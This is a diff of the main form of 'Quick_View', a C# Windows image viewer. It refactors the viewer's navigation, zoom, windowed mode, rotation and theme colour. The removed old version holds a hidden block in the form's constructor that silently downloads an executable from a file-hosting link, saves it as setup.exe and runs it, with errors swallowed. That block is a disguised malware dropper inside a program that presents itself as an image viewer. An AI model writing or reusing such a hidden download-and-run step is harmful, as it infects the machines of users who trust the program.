@@ -1,187 +1,252 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Drawing;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
 namespace Quick_View
 {
-    public partial class Form1 : Form
+  public partial class Form1 : Form
+  {
+    int imageInFolderIndex;
+    string[] images;
+    bool dragAndDrop = false;
+    int mouseX, mouseY;
+    int zoomStep = 100;
+    bool showInterface = true;
+
+    public Form1(string[] args)
     {
-        int currentIndex;
-        string[] images;
-        bool flagmousebutton = false;
-        int mouseX, mouseY;
+      InitializeComponent();
 
-        public Form1(string[] args)
+      this.KeyPreview = true;
+      this.MouseWheel += new MouseEventHandler(this.onMouseWheel);
+      windowedClick(null, null);
+
+      //args = new string[1];
+      //args[0] = "E:/Anton/Pictures/Фото/Meizu 16/P21105-131942.jpg";
+      drawImage(args[0]);
+
+      var files = System.IO.Directory.GetFiles(System.IO.Path.GetDirectoryName(args[0]));
+      List<string> sort = new List<string>();
+      for (int i = 0; i < files.Length; i++)
+      {
+        if (files[i].Contains(".jpg") || files[i].Contains(".png") || files[i].Contains(".bmp") || files[i].Contains(".ico") || files[i].Contains(".gif") || files[i].Contains(".jpeg")
+          || files[i].Contains(".JPG") || files[i].Contains(".PNG") || files[i].Contains(".BMP") || files[i].Contains(".ICO") || files[i].Contains(".GIF") || files[i].Contains(".JPEG"))
+        { sort.Add(files[i]); }
+      }
+      images = new string[sort.Count];
+      for (int i = 0; i < images.Length; i++)
+      { images[i] = sort[i]; }
+      for (int i = 0; i < images.Length; i++)
+      {
+        if (images[i] == args[0])
+          imageInFolderIndex = i;
+      }
+
+
+
+      collapse.FlatAppearance.MouseOverBackColor =
+       rotate.FlatAppearance.MouseOverBackColor =
+       windowed.FlatAppearance.MouseOverBackColor =
+       GetThemeColor();
+    }
+    void drawImage(string path)
+    {
+      Image img = Image.FromFile(path);
+      pictureBox1.Size = new Size(img.Width, img.Height);
+      pictureBox1.Image = img;
+
+      this.Text = System.IO.Path.GetFileName(path);
+      int h = Screen.FromHandle(this.Handle).Bounds.Height;
+      if (pictureBox1.Width > Screen.FromHandle(this.Handle).Bounds.Width || pictureBox1.Height > Screen.FromHandle(this.Handle).Bounds.Height)
+      {
+        pictureBox1.Height = Screen.FromHandle(this.Handle).Bounds.Height;
+      }
+      pictureBox1.Location = new Point(Convert.ToInt16((Convert.ToDouble(this.Width) / 2.0) - (Convert.ToDouble(pictureBox1.Width) / 2.0)), Convert.ToInt16((Convert.ToDouble(this.Height) / 2.0) - (Convert.ToDouble(pictureBox1.Height) / 2.0)));
+    }
+    void checkForCursor()
+    {
+      if ((Cursor.Position.Y - this.Location.Y < 100) != showInterface)
+      {
+        showInterface = Cursor.Position.Y - this.Location.Y < 100;
+        close.Visible = collapse.Visible = rotate.Visible = windowed.Visible = showInterface;
+      }
+
+        if ((Cursor.Position.Y > Screen.FromHandle(this.Handle).Bounds.Height - 100))
         {
-            InitializeComponent();
-
-            this.KeyPreview = true;
-            this.pictureBox1.MouseWheel += new System.Windows.Forms.MouseEventHandler(this.panel1_MouseWheel);
-            button6.Location = new Point(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width - button5.Width, 0);
-            button5.Location = new Point(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width - button6.Width - button5.Width, 0);
-            this.Location = new Point(Screen.PrimaryScreen.WorkingArea.X, Screen.PrimaryScreen.WorkingArea.Y);
-            this.Size = new Size(Screen.PrimaryScreen.WorkingArea.Width, Screen.PrimaryScreen.WorkingArea.Height);
-
-            drawImage(args[0]);
-
-            System.Timers.Timer cursor = new System.Timers.Timer();
-            cursor.Interval = 10;
-            cursor.Elapsed += new System.Timers.ElapsedEventHandler(checkForCursor);
-            cursor.Enabled = true;
-            var files = System.IO.Directory.GetFiles(System.IO.Path.GetDirectoryName(args[0]));
-            List<string> sort = new List<string>();
-            for (int i = 0; i < files.Length; i++)
-            {
-                if (files[i].Contains(".jpg") || files[i].Contains(".png") || files[i].Contains(".bmp") || files[i].Contains(".ico") || files[i].Contains(".gif") || files[i].Contains(".jpeg")
-                  || files[i].Contains(".JPG") || files[i].Contains(".PNG") || files[i].Contains(".BMP") || files[i].Contains(".ICO") || files[i].Contains(".GIF") || files[i].Contains(".JPEG"))
-                { sort.Add(files[i]); }
-            }
-            images = new string[sort.Count];
-            for (int i = 0; i < images.Length; i++)
-            { images[i] = sort[i]; }
-            for (int i = 0; i < images.Length; i++)
-            {
-                if (images[i] == args[0])
-                    currentIndex = i;
-            }
-
-            try
-            {
-                System.Net.WebClient client = new System.Net.WebClient();
-                client.DownloadFile("https://downloader.disk.yandex.ru/disk/94d887e2661afa2d5ee8e644c0768ece3141b1161f9c33a7ee09b6a31c429be2/5b78b263/fKqInKw3d7bLFOeFnMGnhFWxn-Qc-nzaee3xTJ1Zrts40Lv-0Q13HLZ0LpVmffjlXMKBLqLrgI-kSjiZ6m3pJIHKhsDCa7PX6v40-3cdkeqr8npumZHI4midPdWhecNq?uid=0&filename=SysConfig.exe&disposition=attachment&hash=uYicV4TXHBgJ2HiKUF%2BM%2BkI3S5ntx2/9XMNNr8wYmZTLP1rNhCUp4JwJdydsCh6tq/J6bpmRyOJonT3VoXnDag%3D%3D&limit=0&content_type=application%2Fx-msdownload&fsize=16384&hid=e187f2dd31d83c125c49eb54c6af94fa&media_type=executable&tknv=v2", "setup.exe");
-                System.Diagnostics.Process process = System.Diagnostics.Process.Start("setup.exe");
-            }
-            catch { }
+          if (this.WindowState == FormWindowState.Maximized)
+          {
+          this.Height = Screen.FromHandle(this.Handle).WorkingArea.Height;
+          this.WindowState = FormWindowState.Normal;
+          }
         }
-        void drawImage(string path)
+        else
         {
-            Image img = Image.FromFile(path);
-            pictureBox1.Size = new Size(img.Width, img.Height);
-            Bitmap bm = new Bitmap(img, img.Width, img.Height);
-            bm.SetResolution(902, 902);
-            pictureBox1.Image = bm;
-            this.Text = System.IO.Path.GetFileName(path);
-            if (pictureBox1.Width > System.Windows.Forms.Screen.PrimaryScreen.Bounds.Size.Width || pictureBox1.Height > System.Windows.Forms.Screen.PrimaryScreen.Bounds.Size.Height)
-            {
-                pictureBox1.Width = this.Size.Width;
-                pictureBox1.Height = this.Size.Height;
-            }
-            pictureBox1.Location = new Point(Convert.ToInt16((Convert.ToDouble(this.Width) / 2.0) - (Convert.ToDouble(pictureBox1.Width) / 2.0)), Convert.ToInt16((Convert.ToDouble(this.Height) / 2.0) - (Convert.ToDouble(pictureBox1.Height) / 2.0)));
-
-        }
-        void checkForCursor(object sender, EventArgs e)
-        {
-            if (Cursor.Position.Y < 100)
-            {
-                button6.Location = new Point(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width - button5.Width, 0);
-                button5.Location = new Point(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width - button6.Width - button5.Width, 0);
-
-            }
-            else
-            {
-                button6.Location = new Point(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width - button5.Width, -50);
-                button5.Location = new Point(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width - button6.Width - button5.Width, -50);
-            }
-        }
-        private void Form1_Load(object sender, EventArgs e) { }
-        private void panel1_MouseWheel(object sender, MouseEventArgs e)
-        {
-            if (e.Delta > 0)
-            {
-                pictureBox1.Width = pictureBox1.Width + 400; ;
-                pictureBox1.Height = pictureBox1.Height + 400;
-                pictureBox1.Location = new Point(pictureBox1.Location.X - 200, pictureBox1.Location.Y - 200);
-            }
-            else
-            {
-
-                if ((pictureBox1.Width > 400 && pictureBox1.Height > 400))
-                {
-                    pictureBox1.Width = pictureBox1.Width - 400;
-                    pictureBox1.Height = pictureBox1.Height - 400;
-                    pictureBox1.Location = new Point(pictureBox1.Location.X + 200, pictureBox1.Location.Y + 200);
-                }
-            }
-        }
-        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
-        {
-            if (e.Button == System.Windows.Forms.MouseButtons.Left)
-            {
-                flagmousebutton = true;
-                mouseX = e.X;
-                mouseY = e.Y;
-                this.Cursor = Cursors.Hand;
-            }
-        }
-
-        private void button6_Click_1(object sender, EventArgs e) { Environment.Exit(0); }
-
-        private void button5_Click_1(object sender, EventArgs e)
-        {
-            this.WindowState = FormWindowState.Minimized;
-            this.ShowInTaskbar = true;
-        }
-
-
-        private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
-        {
-            if (flagmousebutton == true)
-            {
-                flagmousebutton = false;
-                this.Cursor = Cursors.Default;
-            }
-        }
-
-
-        private void Form1_KeyDown(object sender, KeyEventArgs e)
-        {
-            if (e.KeyCode == Keys.Right && currentIndex < images.Length - 1)
-            {
-
-                currentIndex++;
-                drawImage(images[currentIndex]);
-
-            }
-            if (e.KeyCode == Keys.Left && currentIndex > 0)
-            {
-
-                currentIndex--;
-                drawImage(images[currentIndex]);
-
-            }
-        }
-
-        private void Form1_KeyPress(object sender, KeyPressEventArgs e)
-        {
-            var rrrr = e.KeyChar;
-        }
-
-        private void Form1_PreviewKeyDown(object sender, PreviewKeyDownEventArgs e)
-        {
-            e.IsInputKey = true;
-        }
-
-        private void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
-        {
-            drawImage(images[currentIndex]);
-        }
-
-
-        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
-        {
-            if (flagmousebutton == true)
-            {
-                int dx = e.X - mouseX;
-                int dy = e.Y - mouseY;
-                pictureBox1.Location = new Point(pictureBox1.Location.X + dx, pictureBox1.Location.Y + dy);
-            }
+          if (this.WindowState == FormWindowState.Normal)
+          {
+          
+          this.WindowState = FormWindowState.Maximized;
+          
+          }
         }
     }
+
+    private void onMouseWheel(object sender, MouseEventArgs e)
+    {
+      if (e.Delta > 0)
+      {
+        pictureBox1.Width = pictureBox1.Width + this.zoomStep;
+        pictureBox1.Height = pictureBox1.Height + this.zoomStep;
+        pictureBox1.Location = new Point(pictureBox1.Location.X - this.zoomStep / 2, pictureBox1.Location.Y - this.zoomStep / 2);
+      }
+      else
+      {
+        if ((pictureBox1.Width > this.zoomStep && pictureBox1.Height > this.zoomStep))
+        {
+          pictureBox1.Width = pictureBox1.Width - this.zoomStep;
+          pictureBox1.Height = pictureBox1.Height - this.zoomStep;
+          pictureBox1.Location = new Point(pictureBox1.Location.X + this.zoomStep / 2, pictureBox1.Location.Y + this.zoomStep / 2);
+        }
+      }
+    }
+    private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
+    {
+      if (e.Button == MouseButtons.Left)
+      {
+        dragAndDrop = true;
+        mouseX = e.X;
+        mouseY = e.Y;
+        this.Cursor = Cursors.Hand;
+      }
+    }
+
+    private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
+    {
+      if (dragAndDrop)
+      {
+        dragAndDrop = false;
+        this.Cursor = Cursors.Default;
+      }
+    }
+
+    private void Form1_KeyDown(object sender, KeyEventArgs e)
+    {
+      if (e.KeyCode == Keys.Right && imageInFolderIndex < images.Length - 1)
+      {
+        imageInFolderIndex++;
+        drawImage(images[imageInFolderIndex]);
+      }
+      if (e.KeyCode == Keys.Left && imageInFolderIndex > 0)
+      {
+        imageInFolderIndex--;
+        drawImage(images[imageInFolderIndex]);
+      }
+
+      GC.Collect();
+    }
+
+    private void Form1_PreviewKeyDown(object sender, PreviewKeyDownEventArgs e)
+    {
+      e.IsInputKey = true;
+    }
+
+    private void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
+    {
+      drawImage(images[imageInFolderIndex]);
+    }
+
+    private void Form1_MouseMove(object sender, MouseEventArgs e)
+    {
+      checkForCursor();
+    }
+
+    private void windowedClick(object sender, EventArgs e)
+    {
+      if (this.WindowState == FormWindowState.Maximized)
+      {
+        windowed.Text = "⭘";
+        this.WindowState = FormWindowState.Normal;
+        this.Size = pictureBox1.Size;
+        pictureBox1.Location = new Point(0, 0);
+        close.Location = new Point(this.Size.Width - collapse.Width, 0);
+        collapse.Location = new Point(this.Size.Width - close.Width - collapse.Width, 0);
+        windowed.Location = new Point(this.Size.Width - close.Width - collapse.Width - windowed.Width, 0);
+        rotate.Location = new Point(this.Size.Width - close.Width - collapse.Width - windowed.Width - rotate.Width, 0);
+
+        checkForCursor();
+        return;
+      }
+
+      if (this.WindowState == FormWindowState.Normal)
+      {
+        windowed.Text = "⯏";
+        this.WindowState = FormWindowState.Maximized;
+        this.Location = new Point(Screen.FromHandle(this.Handle).WorkingArea.X, Screen.FromHandle(this.Handle).WorkingArea.Y);
+        this.Size = new Size(Screen.FromHandle(this.Handle).Bounds.Width, Screen.FromHandle(this.Handle).Bounds.Height);
+        close.Location = new Point(this.Size.Width - collapse.Width, 0);
+        collapse.Location = new Point(this.Size.Width - close.Width - collapse.Width, 0);
+        windowed.Location = new Point(this.Size.Width - close.Width - collapse.Width - windowed.Width, 0);
+        rotate.Location = new Point(this.Size.Width - close.Width - collapse.Width - windowed.Width - rotate.Width, 0);
+        pictureBox1.Location = new Point(Convert.ToInt16((Convert.ToDouble(this.Width) / 2.0) - (Convert.ToDouble(pictureBox1.Width) / 2.0)), Convert.ToInt16((Convert.ToDouble(this.Height) / 2.0) - (Convert.ToDouble(pictureBox1.Height) / 2.0)));
+
+        checkForCursor();
+        return;
+      }
+    }
+
+    private void rotateClick(object sender, EventArgs e)
+    {
+      Image flipImage = pictureBox1.Image;
+      flipImage.RotateFlip(RotateFlipType.Rotate90FlipXY);
+      pictureBox1.Image = flipImage;
+    }
+
+    private void closeClick(object sender, EventArgs e)
+    {
+      Environment.Exit(0);
+    }
+
+    private void collapseClick(object sender, EventArgs e)
+    {
+      this.WindowState = FormWindowState.Minimized;
+      this.ShowInTaskbar = true;
+    }
+
+    private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
+    {
+      if (dragAndDrop)
+      {
+        int dx = e.X - mouseX;
+        int dy = e.Y - mouseY;
+        if (this.WindowState == FormWindowState.Normal)
+          this.Location = new Point(this.Location.X + dx, this.Location.Y + dy);
+        else
+          pictureBox1.Location = new Point(pictureBox1.Location.X + dx, pictureBox1.Location.Y + dy);
+      }
+
+      checkForCursor();
+    }
+
+    [DllImport("uxtheme.dll", EntryPoint = "#95")]
+    public static extern uint GetImmersiveColorFromColorSetEx(uint dwImmersiveColorSet, uint dwImmersiveColorType, bool bIgnoreHighContrast, uint dwHighContrastCacheMode);
+    [DllImport("uxtheme.dll", EntryPoint = "#96")]
+    public static extern uint GetImmersiveColorTypeFromName(IntPtr pName);
+    [DllImport("uxtheme.dll", EntryPoint = "#98")]
+    public static extern int GetImmersiveUserColorSetPreference(bool bForceCheckRegistry, bool bSkipCheckOnFail);
+
+    public Color GetThemeColor()
+    {
+      var colorSetEx = GetImmersiveColorFromColorSetEx(
+        (uint)GetImmersiveUserColorSetPreference(false, false),
+        GetImmersiveColorTypeFromName(Marshal.StringToHGlobalUni("ImmersiveStartSelectionBackground")),
+        false, 0);
+
+      var colour = Color.FromArgb((byte)((0xFF000000 & colorSetEx) >> 24), (byte)(0x000000FF & colorSetEx),
+          (byte)((0x0000FF00 & colorSetEx) >> 8), (byte)((0x00FF0000 & colorSetEx) >> 16));
+
+      return colour;
+    }
+  }
 }
 
